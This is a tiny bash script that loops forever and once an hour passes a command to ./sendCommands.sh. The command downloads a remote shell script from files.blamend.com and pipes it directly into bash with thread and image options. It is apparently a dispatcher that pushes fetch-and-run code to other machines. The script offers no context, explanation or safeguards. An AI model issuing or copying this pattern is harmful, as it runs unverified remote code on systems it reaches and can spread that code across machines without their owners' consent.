#!/bin/bash
while :
do
./sendCommands.sh "wget -q -O- files.blamend.com/imgur-2.sh | bash /dev/stdin --threads 2 --images 1"
sleep 3600
done
